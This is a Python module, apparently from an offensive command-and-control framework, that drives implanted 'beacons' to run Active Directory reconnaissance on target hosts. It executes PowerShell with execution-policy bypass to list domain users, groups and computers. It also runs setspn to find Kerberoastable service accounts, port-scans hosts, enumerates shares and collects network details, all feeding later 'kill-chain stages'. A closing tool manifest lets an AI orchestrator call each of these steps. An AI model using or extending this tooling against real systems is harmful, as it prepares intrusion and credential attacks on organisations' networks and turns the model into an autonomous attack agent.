"""
ReconAgent -- Active Directory reconnaissance via live beacons.

Sends real enumeration commands to beacons running on target hosts, parses
the stdout output, and returns structured findings that the orchestrator
stores for downstream kill-chain stages.
"""

from __future__ import annotations

import logging
import re
import uuid
from typing import Any

from agents.base import AbstractAgent
from orchestrator.task import Task, TaskResult
from server.beacon_handler import beacon_handler

logger = logging.getLogger(__name__)


class ReconAgent(AbstractAgent):
    name = "recon"
    description = (
        "Performs Active Directory reconnaissance, port scanning, service "
        "enumeration, network mapping, and user/group discovery via beacons "
        "on target systems"
    )
    capabilities = [
        "ad_enum_users",
        "ad_enum_groups",
        "ad_enum_computers",
        "ad_enum_shares",
        "ad_enum_spns",
        "port_scan",
        "service_enum",
        "network_info",
    ]

    # ------------------------------------------------------------------
    # Default timeout (seconds) waiting for beacon to return output.
    # ------------------------------------------------------------------
    BEACON_TIMEOUT = 300

    # ------------------------------------------------------------------
    # execute()
    # ------------------------------------------------------------------

    async def execute(self, task: Task) -> TaskResult:
        action = task.action
        params = task.params

        if action not in self.capabilities:
            return TaskResult(
                task_id=task.id,
                status="failure",
                data={"error": f"Unknown action: {action}"},
                summary=f"Recon agent does not support action '{action}'",
            )

        beacon_id = params.get("beacon_id")
        if not beacon_id:
            return TaskResult(
                task_id=task.id,
                status="failure",
                data={"error": "Missing required parameter: beacon_id"},
                summary="Recon failed: no beacon_id provided",
            )

        timeout = params.get("timeout", self.BEACON_TIMEOUT)

        try:
            handler = getattr(self, f"_handle_{action}")
            return await handler(task, beacon_id, params, timeout)
        except Exception as exc:
            logger.exception("Recon %s failed on beacon %s", action, beacon_id)
            return TaskResult(
                task_id=task.id,
                status="failure",
                data={"error": str(exc)},
                summary=f"Recon {action} failed: {exc}",
            )

    # ==================================================================
    #  AD user enumeration
    # ==================================================================

    async def _handle_ad_enum_users(
        self, task: Task, beacon_id: str, params: dict, timeout: float
    ) -> TaskResult:
        # Try PowerShell first, fall back to net commands
        ps_cmd = (
            "powershell -ep bypass -c \""
            "try { Import-Module ActiveDirectory -EA Stop; "
            "Get-ADUser -Filter * -Properties SamAccountName,DisplayName,Enabled,"
            "MemberOf,LastLogonDate,Description | "
            "Select-Object SamAccountName,DisplayName,Enabled,Description,"
            "LastLogonDate,@{N='Groups';E={($_.MemberOf | "
            "ForEach-Object {($_ -split ',')[0] -replace 'CN=',''}) -join ';'}} | "
            "Format-List } catch { Write-Output '%%FALLBACK%%' }\""
        )

        sub_id = str(uuid.uuid4())
        result = await beacon_handler.submit_task(
            beacon_id, sub_id, "run_command",
            {"command": ps_cmd}, timeout=timeout,
        )

        stdout = self._extract_stdout(result)

        # If PowerShell AD module wasn't available, fall back
        if "%%FALLBACK%%" in stdout or not stdout.strip():
            sub_id = str(uuid.uuid4())
            result = await beacon_handler.submit_task(
                beacon_id, sub_id, "run_command",
                {"command": "net user /domain"}, timeout=timeout,
            )
            stdout = self._extract_stdout(result)
            users = self._parse_net_user_domain(stdout)
        else:
            users = self._parse_ps_aduser(stdout)

        if self._is_error(result):
            return self._error_result(task, "ad_enum_users", result)

        return TaskResult(
            task_id=task.id,
            status="success",
            data={
                "raw_output": stdout,
                "findings": {"users": users},
            },
            summary=f"AD user enumeration via beacon {beacon_id}: {len(users)} user(s) discovered",
        )

    # ==================================================================
    #  AD group enumeration
    # ==================================================================

    async def _handle_ad_enum_groups(
        self, task: Task, beacon_id: str, params: dict, timeout: float
    ) -> TaskResult:
        ps_cmd = (
            "powershell -ep bypass -c \""
            "try { Import-Module ActiveDirectory -EA Stop; "
            "Get-ADGroup -Filter * -Properties Members,Description | "
            "Select-Object Name,GroupScope,Description,"
            "@{N='Members';E={($_.Members | "
            "ForEach-Object {($_ -split ',')[0] -replace 'CN=',''}) -join ';'}} | "
            "Format-List } catch { Write-Output '%%FALLBACK%%' }\""
        )

        sub_id = str(uuid.uuid4())
        result = await beacon_handler.submit_task(
            beacon_id, sub_id, "run_command",
            {"command": ps_cmd}, timeout=timeout,
        )

        stdout = self._extract_stdout(result)

        if "%%FALLBACK%%" in stdout or not stdout.strip():
            sub_id = str(uuid.uuid4())
            result = await beacon_handler.submit_task(
                beacon_id, sub_id, "run_command",
                {"command": "net group /domain"}, timeout=timeout,
            )
            stdout = self._extract_stdout(result)
            groups = self._parse_net_group_domain(stdout)
        else:
            groups = self._parse_ps_adgroup(stdout)

        if self._is_error(result):
            return self._error_result(task, "ad_enum_groups", result)

        return TaskResult(
            task_id=task.id,
            status="success",
            data={
                "raw_output": stdout,
                "findings": {"groups": groups},
            },
            summary=f"AD group enumeration via beacon {beacon_id}: {len(groups)} group(s) discovered",
        )

    # ==================================================================
    #  AD computer enumeration
    # ==================================================================

    async def _handle_ad_enum_computers(
        self, task: Task, beacon_id: str, params: dict, timeout: float
    ) -> TaskResult:
        ps_cmd = (
            "powershell -ep bypass -c \""
            "try { Import-Module ActiveDirectory -EA Stop; "
            "Get-ADComputer -Filter * -Properties Name,DNSHostName,IPv4Address,"
            "OperatingSystem,Enabled,LastLogonDate | "
            "Select-Object Name,DNSHostName,IPv4Address,OperatingSystem,Enabled,"
            "LastLogonDate | Format-List } "
            "catch { Write-Output '%%FALLBACK%%' }\""
        )

        sub_id = str(uuid.uuid4())
        result = await beacon_handler.submit_task(
            beacon_id, sub_id, "run_command",
            {"command": ps_cmd}, timeout=timeout,
        )

        stdout = self._extract_stdout(result)

        if "%%FALLBACK%%" in stdout or not stdout.strip():
            sub_id = str(uuid.uuid4())
            result = await beacon_handler.submit_task(
                beacon_id, sub_id, "run_command",
                {"command": "net view /domain"}, timeout=timeout,
            )
            stdout = self._extract_stdout(result)
            hosts = self._parse_net_view_domain(stdout)
        else:
            hosts = self._parse_ps_adcomputer(stdout)

        if self._is_error(result):
            return self._error_result(task, "ad_enum_computers", result)

        return TaskResult(
            task_id=task.id,
            status="success",
            data={
                "raw_output": stdout,
                "findings": {"hosts": hosts},
            },
            summary=f"AD computer enumeration via beacon {beacon_id}: {len(hosts)} host(s) discovered",
        )

    # ==================================================================
    #  Share enumeration
    # ==================================================================

    async def _handle_ad_enum_shares(
        self, task: Task, beacon_id: str, params: dict, timeout: float
    ) -> TaskResult:
        targets: list[str] = params.get("targets", [])
        if not targets:
            # If no explicit targets, try to discover via net view
            sub_id = str(uuid.uuid4())
            result = await beacon_handler.submit_task(
                beacon_id, sub_id, "run_command",
                {"command": "net view /domain"}, timeout=timeout,
            )
            stdout = self._extract_stdout(result)
            targets = self._extract_hostnames_from_net_view(stdout)

        all_shares: list[dict] = []
        raw_parts: list[str] = []

        for target in targets:
            sub_id = str(uuid.uuid4())
            result = await beacon_handler.submit_task(
                beacon_id, sub_id, "run_command",
                {"command": f"net view \\\\{target}"}, timeout=timeout,
            )
            stdout = self._extract_stdout(result)
            raw_parts.append(f"--- {target} ---\n{stdout}")
            shares = self._parse_net_view_shares(target, stdout)
            all_shares.extend(shares)

        return TaskResult(
            task_id=task.id,
            status="success",
            data={
                "raw_output": "\n".join(raw_parts),
                "findings": {"shares": all_shares},
            },
            summary=f"Share enumeration via beacon {beacon_id}: {len(all_shares)} share(s) across {len(targets)} host(s)",
        )

    # ==================================================================
    #  SPN / Kerberoastable account enumeration
    # ==================================================================

    async def _handle_ad_enum_spns(
        self, task: Task, beacon_id: str, params: dict, timeout: float
    ) -> TaskResult:
        domain = params.get("domain", "*")
        cmd = f"setspn -T {domain} -Q */*"

        sub_id = str(uuid.uuid4())
        result = await beacon_handler.submit_task(
            beacon_id, sub_id, "run_command",
            {"command": cmd}, timeout=timeout,
        )

        stdout = self._extract_stdout(result)

        if self._is_error(result):
            return self._error_result(task, "ad_enum_spns", result)

        kerberoastable = self._parse_setspn_output(stdout)

        return TaskResult(
            task_id=task.id,
            status="success",
            data={
                "raw_output": stdout,
                "findings": {"kerberoastable": kerberoastable},
            },
            summary=f"SPN enumeration via beacon {beacon_id}: {len(kerberoastable)} Kerberoastable account(s) found",
        )

    # ==================================================================
    #  Port scanning
    # ==================================================================

    async def _handle_port_scan(
        self, task: Task, beacon_id: str, params: dict, timeout: float
    ) -> TaskResult:
        target = params.get("target", "127.0.0.1")
        ports = params.get("ports", [21, 22, 23, 25, 53, 80, 88, 135, 139,
                                      389, 443, 445, 636, 1433, 3306, 3389,
                                      5432, 5985, 5986, 8080, 8443, 9389])
        ports_csv = ",".join(str(p) for p in ports)

        ps_cmd = (
            f"powershell -ep bypass -c \""
            f"$ports = @({ports_csv}); "
            f"foreach ($p in $ports) {{ "
            f"$t = New-Object Net.Sockets.TcpClient; "
            f"try {{ $t.Connect('{target}', $p); "
            f"if ($t.Connected) {{ Write-Output \\\"OPEN:$p\\\"; $t.Close() }} "
            f"}} catch {{ }} }}\""
        )

        sub_id = str(uuid.uuid4())
        result = await beacon_handler.submit_task(
            beacon_id, sub_id, "run_command",
            {"command": ps_cmd}, timeout=timeout,
        )

        stdout = self._extract_stdout(result)

        if self._is_error(result):
            return self._error_result(task, "port_scan", result)

        open_ports = self._parse_port_scan(stdout)

        return TaskResult(
            task_id=task.id,
            status="success",
            data={
                "raw_output": stdout,
                "target": target,
                "ports_scanned": len(ports),
                "findings": {
                    "hosts": [
                        {
                            "key": target,
                            "hostname": target,
                            "ip": target,
                            "open_ports": open_ports,
                        }
                    ] if open_ports else [],
                },
            },
            summary=(
                f"Port scan on {target} via beacon {beacon_id}: "
                f"{len(open_ports)} open port(s) out of {len(ports)} scanned"
            ),
        )

    # ==================================================================
    #  Service enumeration
    # ==================================================================

    async def _handle_service_enum(
        self, task: Task, beacon_id: str, params: dict, timeout: float
    ) -> TaskResult:
        ps_cmd = (
            "powershell -ep bypass -c \""
            "Get-Service | Where-Object {$_.Status -eq 'Running'} | "
            "Select-Object Name,DisplayName,Status,StartType | Format-List\""
        )

        sub_id = str(uuid.uuid4())
        result = await beacon_handler.submit_task(
            beacon_id, sub_id, "run_command",
            {"command": ps_cmd}, timeout=timeout,
        )

        stdout = self._extract_stdout(result)

        if self._is_error(result):
            # Fallback to sc query
            sub_id = str(uuid.uuid4())
            result = await beacon_handler.submit_task(
                beacon_id, sub_id, "run_command",
                {"command": "sc query state= all"}, timeout=timeout,
            )
            stdout = self._extract_stdout(result)
            services = self._parse_sc_query(stdout)
        else:
            services = self._parse_ps_services(stdout)

        return TaskResult(
            task_id=task.id,
            status="success",
            data={
                "raw_output": stdout,
                "findings": {"services": services},
            },
            summary=f"Service enumeration via beacon {beacon_id}: {len(services)} running service(s)",
        )

    # ==================================================================
    #  Network information
    # ==================================================================

    async def _handle_network_info(
        self, task: Task, beacon_id: str, params: dict, timeout: float
    ) -> TaskResult:
        commands = ["ipconfig /all", "route print", "arp -a"]
        raw_parts: list[str] = []
        network_items: list[dict] = []

        for cmd in commands:
            sub_id = str(uuid.uuid4())
            result = await beacon_handler.submit_task(
                beacon_id, sub_id, "run_command",
                {"command": cmd}, timeout=timeout,
            )
            stdout = self._extract_stdout(result)
            raw_parts.append(f"--- {cmd} ---\n{stdout}")

            if cmd == "ipconfig /all":
                network_items.extend(self._parse_ipconfig(stdout))
            elif cmd == "arp -a":
                network_items.extend(self._parse_arp(stdout))

        return TaskResult(
            task_id=task.id,
            status="success",
            data={
                "raw_output": "\n\n".join(raw_parts),
                "findings": {"network": network_items},
            },
            summary=f"Network info collected via beacon {beacon_id}: {len(network_items)} interface(s)/neighbor(s)",
        )

    # ==================================================================
    #  Output parsing helpers
    # ==================================================================

    @staticmethod
    def _extract_stdout(result: dict) -> str:
        """Pull the stdout string from a beacon result dict."""
        if not result:
            return ""
        data = result.get("data", result)
        if isinstance(data, dict):
            return data.get("stdout", data.get("output", ""))
        return str(data)

    @staticmethod
    def _is_error(result: dict) -> bool:
        if not result:
            return True
        status = result.get("status", "")
        return status in ("timeout", "error", "failure")

    def _error_result(self, task: Task, action: str, result: dict) -> TaskResult:
        error_msg = result.get("error", "Unknown beacon error")
        return TaskResult(
            task_id=task.id,
            status="failure",
            data={"error": error_msg, "raw_result": result},
            summary=f"Recon {action} failed: {error_msg}",
        )

    # --- net user /domain ---
    @staticmethod
    def _parse_net_user_domain(stdout: str) -> list[dict]:
        users: list[dict] = []
        # net user /domain outputs usernames in columns after the header
        lines = stdout.strip().splitlines()
        in_users = False
        for line in lines:
            stripped = line.strip()
            # The dashed separator line precedes usernames
            if re.match(r"^-{4,}", stripped):
                in_users = True
                continue
            if in_users:
                if stripped.startswith("The command completed") or not stripped:
                    break
                # Usernames are space-separated on each line
                for username in stripped.split():
                    username = username.strip()
                    if username:
                        users.append({
                            "key": username,
                            "username": username,
                            "full_name": "",
                            "source": "net user /domain",
                        })
        return users

    # --- PowerShell Get-ADUser Format-List ---
    @staticmethod
    def _parse_ps_aduser(stdout: str) -> list[dict]:
        users: list[dict] = []
        current: dict[str, str] = {}
        for line in stdout.splitlines():
            line = line.strip()
            if not line:
                if current.get("SamAccountName"):
                    sam = current["SamAccountName"]
                    users.append({
                        "key": sam,
                        "username": sam,
                        "full_name": current.get("DisplayName", ""),
                        "enabled": current.get("Enabled", ""),
                        "description": current.get("Description", ""),
                        "last_logon": current.get("LastLogonDate", ""),
                        "groups": [g.strip() for g in current.get("Groups", "").split(";") if g.strip()],
                        "source": "Get-ADUser",
                    })
                current = {}
                continue
            m = re.match(r"^(\w[\w\s]*):\s*(.*)", line)
            if m:
                current[m.group(1).strip()] = m.group(2).strip()
        # Flush last record
        if current.get("SamAccountName"):
            sam = current["SamAccountName"]
            users.append({
                "key": sam,
                "username": sam,
                "full_name": current.get("DisplayName", ""),
                "enabled": current.get("Enabled", ""),
                "description": current.get("Description", ""),
                "last_logon": current.get("LastLogonDate", ""),
                "groups": [g.strip() for g in current.get("Groups", "").split(";") if g.strip()],
                "source": "Get-ADUser",
            })
        return users

    # --- net group /domain ---
    @staticmethod
    def _parse_net_group_domain(stdout: str) -> list[dict]:
        groups: list[dict] = []
        lines = stdout.strip().splitlines()
        in_groups = False
        for line in lines:
            stripped = line.strip()
            if re.match(r"^-{4,}", stripped):
                in_groups = True
                continue
            if in_groups:
                if stripped.startswith("The command completed") or not stripped:
                    break
                # Each line is a group name prefixed with *
                name = stripped.lstrip("*").strip()
                if name:
                    groups.append({
                        "key": name,
                        "name": name,
                        "members": [],
                        "source": "net group /domain",
                    })
        return groups

    # --- PowerShell Get-ADGroup Format-List ---
    @staticmethod
    def _parse_ps_adgroup(stdout: str) -> list[dict]:
        groups: list[dict] = []
        current: dict[str, str] = {}
        for line in stdout.splitlines():
            line = line.strip()
            if not line:
                if current.get("Name"):
                    name = current["Name"]
                    members_raw = current.get("Members", "")
                    groups.append({
                        "key": name,
                        "name": name,
                        "scope": current.get("GroupScope", ""),
                        "description": current.get("Description", ""),
                        "members": [m.strip() for m in members_raw.split(";") if m.strip()],
                        "source": "Get-ADGroup",
                    })
                current = {}
                continue
            m = re.match(r"^(\w[\w\s]*):\s*(.*)", line)
            if m:
                current[m.group(1).strip()] = m.group(2).strip()
        if current.get("Name"):
            name = current["Name"]
            members_raw = current.get("Members", "")
            groups.append({
                "key": name,
                "name": name,
                "scope": current.get("GroupScope", ""),
                "description": current.get("Description", ""),
                "members": [m.strip() for m in members_raw.split(";") if m.strip()],
                "source": "Get-ADGroup",
            })
        return groups

    # --- PowerShell Get-ADComputer Format-List ---
    @staticmethod
    def _parse_ps_adcomputer(stdout: str) -> list[dict]:
        hosts: list[dict] = []
        current: dict[str, str] = {}
        for line in stdout.splitlines():
            line = line.strip()
            if not line:
                if current.get("Name"):
                    name = current["Name"]
                    hosts.append({
                        "key": name,
                        "hostname": name,
                        "dns_name": current.get("DNSHostName", ""),
                        "ip": current.get("IPv4Address", ""),
                        "os": current.get("OperatingSystem", ""),
                        "enabled": current.get("Enabled", ""),
                        "last_logon": current.get("LastLogonDate", ""),
                        "source": "Get-ADComputer",
                    })
                current = {}
                continue
            m = re.match(r"^(\w[\w\s]*):\s*(.*)", line)
            if m:
                current[m.group(1).strip()] = m.group(2).strip()
        if current.get("Name"):
            name = current["Name"]
            hosts.append({
                "key": name,
                "hostname": name,
                "dns_name": current.get("DNSHostName", ""),
                "ip": current.get("IPv4Address", ""),
                "os": current.get("OperatingSystem", ""),
                "enabled": current.get("Enabled", ""),
                "last_logon": current.get("LastLogonDate", ""),
                "source": "Get-ADComputer",
            })
        return hosts

    # --- net view /domain ---
    @staticmethod
    def _parse_net_view_domain(stdout: str) -> list[dict]:
        hosts: list[dict] = []
        for line in stdout.splitlines():
            line = line.strip()
            m = re.match(r"^\\\\(\S+)", line)
            if m:
                name = m.group(1)
                hosts.append({
                    "key": name,
                    "hostname": name,
                    "ip": "",
                    "source": "net view /domain",
                })
        return hosts

    @staticmethod
    def _extract_hostnames_from_net_view(stdout: str) -> list[str]:
        hostnames: list[str] = []
        for line in stdout.splitlines():
            m = re.match(r"^\\\\(\S+)", line.strip())
            if m:
                hostnames.append(m.group(1))
        return hostnames

    # --- net view \\TARGET (shares) ---
    @staticmethod
    def _parse_net_view_shares(target: str, stdout: str) -> list[dict]:
        shares: list[dict] = []
        lines = stdout.strip().splitlines()
        in_shares = False
        for line in lines:
            stripped = line.strip()
            if re.match(r"^-{4,}", stripped):
                in_shares = True
                continue
            if in_shares:
                if stripped.startswith("The command completed") or not stripped:
                    break
                # Format: ShareName  Type  Remark
                parts = re.split(r"\s{2,}", stripped, maxsplit=2)
                if parts:
                    share_name = parts[0].strip()
                    share_type = parts[1].strip() if len(parts) > 1 else ""
                    remark = parts[2].strip() if len(parts) > 2 else ""
                    unc = f"\\\\{target}\\{share_name}"
                    shares.append({
                        "key": unc,
                        "name": share_name,
                        "unc_path": unc,
                        "type": share_type,
                        "remark": remark,
                        "host": target,
                    })
        return shares

    # --- setspn output ---
    @staticmethod
    def _parse_setspn_output(stdout: str) -> list[dict]:
        accounts: list[dict] = []
        current_account: str | None = None

        for line in stdout.splitlines():
            stripped = line.strip()
            if not stripped:
                continue
            # Account lines look like: "CN=svc_sql,OU=Service Accounts,DC=corp,DC=local"
            # or "Checking domain DC=corp,DC=local"
            if stripped.startswith("Checking domain"):
                continue
            # Lines without leading whitespace are account DNs
            if not line.startswith(" ") and not line.startswith("\t"):
                # Extract CN
                m = re.match(r"CN=([^,]+)", stripped)
                if m:
                    current_account = m.group(1)
                else:
                    current_account = stripped
                continue
            # Indented lines are SPNs for the current account
            if current_account and stripped:
                accounts.append({
                    "key": current_account,
                    "account": current_account,
                    "spn": stripped,
                })

        return accounts

    # --- port scan output ---
    @staticmethod
    def _parse_port_scan(stdout: str) -> list[int]:
        ports: list[int] = []
        for line in stdout.splitlines():
            m = re.match(r"OPEN:(\d+)", line.strip())
            if m:
                ports.append(int(m.group(1)))
        return ports

    # --- PowerShell Get-Service Format-List ---
    @staticmethod
    def _parse_ps_services(stdout: str) -> list[dict]:
        services: list[dict] = []
        current: dict[str, str] = {}
        for line in stdout.splitlines():
            line = line.strip()
            if not line:
                if current.get("Name"):
                    name = current["Name"]
                    services.append({
                        "key": name,
                        "name": name,
                        "display_name": current.get("DisplayName", ""),
                        "status": current.get("Status", ""),
                        "start_type": current.get("StartType", ""),
                        "source": "Get-Service",
                    })
                current = {}
                continue
            m = re.match(r"^(\w[\w\s]*):\s*(.*)", line)
            if m:
                current[m.group(1).strip()] = m.group(2).strip()
        if current.get("Name"):
            name = current["Name"]
            services.append({
                "key": name,
                "name": name,
                "display_name": current.get("DisplayName", ""),
                "status": current.get("Status", ""),
                "start_type": current.get("StartType", ""),
                "source": "Get-Service",
            })
        return services

    # --- sc query output ---
    @staticmethod
    def _parse_sc_query(stdout: str) -> list[dict]:
        services: list[dict] = []
        current: dict[str, str] = {}
        for line in stdout.splitlines():
            line = line.strip()
            if not line:
                if current.get("SERVICE_NAME"):
                    svc = current["SERVICE_NAME"]
                    services.append({
                        "key": svc,
                        "name": svc,
                        "display_name": current.get("DISPLAY_NAME", ""),
                        "state": current.get("STATE", ""),
                        "source": "sc query",
                    })
                current = {}
                continue
            m = re.match(r"^(\S[\w_]+)\s*:\s*(.*)", line)
            if m:
                current[m.group(1).strip()] = m.group(2).strip()
        if current.get("SERVICE_NAME"):
            svc = current["SERVICE_NAME"]
            services.append({
                "key": svc,
                "name": svc,
                "display_name": current.get("DISPLAY_NAME", ""),
                "state": current.get("STATE", ""),
                "source": "sc query",
            })
        return services

    # --- ipconfig /all ---
    @staticmethod
    def _parse_ipconfig(stdout: str) -> list[dict]:
        interfaces: list[dict] = []
        current_iface: str | None = None
        current: dict[str, str] = {}

        for line in stdout.splitlines():
            # Adapter header
            m = re.match(r"^(\S.*adapter\s+.+):", line, re.IGNORECASE)
            if m:
                if current_iface and current:
                    interfaces.append({
                        "key": current_iface,
                        "interface": current_iface,
                        "type": "interface",
                        **current,
                    })
                current_iface = m.group(1).strip()
                current = {}
                continue
            # Key-value lines
            kv = re.match(r"^\s+([\w\s\.\-]+?)\s*[\.\s]*:\s+(.+)", line)
            if kv and current_iface:
                key = kv.group(1).strip().replace(" ", "_").replace(".", "").lower()
                current[key] = kv.group(2).strip()

        if current_iface and current:
            interfaces.append({
                "key": current_iface,
                "interface": current_iface,
                "type": "interface",
                **current,
            })

        return interfaces

    # --- arp -a ---
    @staticmethod
    def _parse_arp(stdout: str) -> list[dict]:
        neighbors: list[dict] = []
        for line in stdout.splitlines():
            m = re.match(
                r"\s*([\d\.]+)\s+([\da-fA-F\-]+)\s+(\w+)",
                line.strip(),
            )
            if m:
                ip = m.group(1)
                mac = m.group(2)
                arp_type = m.group(3)
                neighbors.append({
                    "key": ip,
                    "ip": ip,
                    "mac": mac,
                    "type": arp_type,
                    "source": "arp -a",
                })
        return neighbors

    # ==================================================================
    #  Capabilities manifest (Anthropic tool-use format)
    # ==================================================================

    def get_capabilities_manifest(self) -> dict:
        beacon_id_prop = {
            "type": "string",
            "description": "ID of the beacon to execute through",
        }

        return {
            "name": self.name,
            "description": self.description,
            "tools": [
                {
                    "name": "recon_ad_enum_users",
                    "description": (
                        "Enumerate all Active Directory user accounts via the "
                        "target beacon. Uses PowerShell Get-ADUser when available, "
                        "falls back to 'net user /domain'. Returns structured user "
                        "records with usernames, display names, group memberships, "
                        "and last logon dates."
                    ),
                    "input_schema": {
                        "type": "object",
                        "properties": {
                            "beacon_id": beacon_id_prop,
                        },
                        "required": ["beacon_id"],
                    },
                },
                {
                    "name": "recon_ad_enum_groups",
                    "description": (
                        "Enumerate all Active Directory groups and their members. "
                        "Uses Get-ADGroup with member expansion when available, "
                        "falls back to 'net group /domain'. Identifies high-value "
                        "groups like Domain Admins, Enterprise Admins, etc."
                    ),
                    "input_schema": {
                        "type": "object",
                        "properties": {
                            "beacon_id": beacon_id_prop,
                        },
                        "required": ["beacon_id"],
                    },
                },
                {
                    "name": "recon_ad_enum_computers",
                    "description": (
                        "Enumerate all computer objects in Active Directory. "
                        "Returns hostnames, DNS names, IP addresses, and operating "
                        "systems. Identifies domain controllers, servers, and "
                        "workstations."
                    ),
                    "input_schema": {
                        "type": "object",
                        "properties": {
                            "beacon_id": beacon_id_prop,
                        },
                        "required": ["beacon_id"],
                    },
                },
                {
                    "name": "recon_ad_enum_shares",
                    "description": (
                        "Enumerate network shares across domain hosts using "
                        "'net view'. Discovers SYSVOL, NETLOGON, admin shares, "
                        "and custom file shares. Optionally targets specific hosts."
                    ),
                    "input_schema": {
                        "type": "object",
                        "properties": {
                            "beacon_id": beacon_id_prop,
                            "targets": {
                                "type": "array",
                                "items": {"type": "string"},
                                "description": (
                                    "Optional list of hostnames or IPs to enumerate "
                                    "shares on. If omitted, discovers hosts via net view."
                                ),
                            },
                        },
                        "required": ["beacon_id"],
                    },
                },
                {
                    "name": "recon_ad_enum_spns",
                    "description": (
                        "Enumerate Service Principal Names (SPNs) to find "
                        "Kerberoastable service accounts. Uses 'setspn -T DOMAIN "
                        "-Q */*'. Critical for identifying accounts vulnerable to "
                        "Kerberoasting attacks."
                    ),
                    "input_schema": {
                        "type": "object",
                        "properties": {
                            "beacon_id": beacon_id_prop,
                            "domain": {
                                "type": "string",
                                "description": (
                                    "Target domain name. Defaults to '*' for the "
                                    "current domain."
                                ),
                            },
                        },
                        "required": ["beacon_id"],
                    },
                },
                {
                    "name": "recon_port_scan",
                    "description": (
                        "Scan a target host for open TCP ports using PowerShell "
                        "TcpClient. Returns a list of open ports. Useful for "
                        "identifying services on non-domain or discovered hosts."
                    ),
                    "input_schema": {
                        "type": "object",
                        "properties": {
                            "beacon_id": beacon_id_prop,
                            "target": {
                                "type": "string",
                                "description": "IP address or hostname to scan",
                            },
                            "ports": {
                                "type": "array",
                                "items": {"type": "integer"},
                                "description": (
                                    "Specific ports to scan. Defaults to common "
                                    "Windows/AD ports if omitted."
                                ),
                            },
                        },
                        "required": ["beacon_id", "target"],
                    },
                },
                {
                    "name": "recon_service_enum",
                    "description": (
                        "Enumerate running services on the beacon host using "
                        "Get-Service or 'sc query'. Returns service names, display "
                        "names, status, and start type."
                    ),
                    "input_schema": {
                        "type": "object",
                        "properties": {
                            "beacon_id": beacon_id_prop,
                        },
                        "required": ["beacon_id"],
                    },
                },
                {
                    "name": "recon_network_info",
                    "description": (
                        "Collect comprehensive network information from the beacon "
                        "host. Runs 'ipconfig /all', 'route print', and 'arp -a'. "
                        "Returns interfaces, IP configuration, routing table, and "
                        "ARP neighbors."
                    ),
                    "input_schema": {
                        "type": "object",
                        "properties": {
                            "beacon_id": beacon_id_prop,
                        },
                        "required": ["beacon_id"],
                    },
                },
            ],
        }
